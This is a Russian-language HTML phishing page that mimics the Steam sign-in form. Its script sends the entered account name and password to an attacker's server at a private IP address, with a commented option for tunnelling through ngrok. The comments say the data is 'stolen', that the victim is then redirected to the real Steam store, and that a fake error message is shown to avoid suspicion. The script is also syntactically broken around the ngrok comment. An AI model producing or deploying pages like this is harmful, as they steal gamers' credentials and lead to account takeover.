<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Войти в Steam</title>
    <link rel="stylesheet" href="steam_phisch_style.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: "Inter", Arial, Helvetica, sans-serif; }
    </style>
</head>
<body>
    <div class="login_container">
        <h2>Войти в Steam</h2>
        <form id="steamLoginForm">
            <div class="form_group">
                <label for="username">Имя аккаунта Steam</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form_group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="remember_me">
                <input type="checkbox" id="remember_me" name="remember_me">
                <label for="remember_me">Запомнить меня</label>
            </div>
            <button type="submit" class="login_btn">Войти</button>
            <div class="error_message" id="errorMessage">Неверное имя аккаунта или пароль.</div>
        </form>

        <div class="login_links">
            <a href="#">Забыли пароль?</a>
            <span class="separator">|</span>
            <a href="#">Помощь</a>
        </div>

        <div class="join_steam_wrapper">
            <p>Ещё нет аккаунта Steam?</p>
            <a href="#" class="join_steam_btn">Присоединиться к Steam</a>
        </div>
    </div>

    <script>
        document.getElementById('steamLoginForm').addEventListener('submit', async (event) => {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('errorMessage');
            const loginButton = document.querySelector('.login_btn');

            // Визуал: имитация загрузки
            loginButton.textContent = 'Вход...';
            loginButton.disabled = true;
            errorMessage.style.display = 'none';

            try {
                // !!! ВАЖНО: Замени 'http://localhost:1084/api/login' на IP твоего сервера !!!
               const response = await fetch('http://192.168.110.221:1084/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: username, password: password })
});

// Через ngrok (раскомментируй и впиши свой адрес, когда запустишь ngrok):
// fetch('https://твой-адрес.ngrok-free.app/api/login', ...)', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password }),
                });

                if (response.ok) {
                    console.log('Данные успешно украдены.');
                    // Кидаем жертву на настоящий Steam
                    window.location.href = 'https://store.steampowered.com/';
                } else {
                    // Если сервер вернул ошибку (например, пустые поля)
                    throw new Error('Server error');
                }
            } catch (error) {
                console.error('Network error:', error);
                // Если ошибка сети (неправильный IP или сервер упал)
                // Показываем фейковую ошибку Steam, чтобы не вызвать подозрений
                errorMessage.style.display = 'block';
                loginButton.textContent = 'Войти';
                loginButton.disabled = false;
            }
        });
    </script>
</body>
</html>
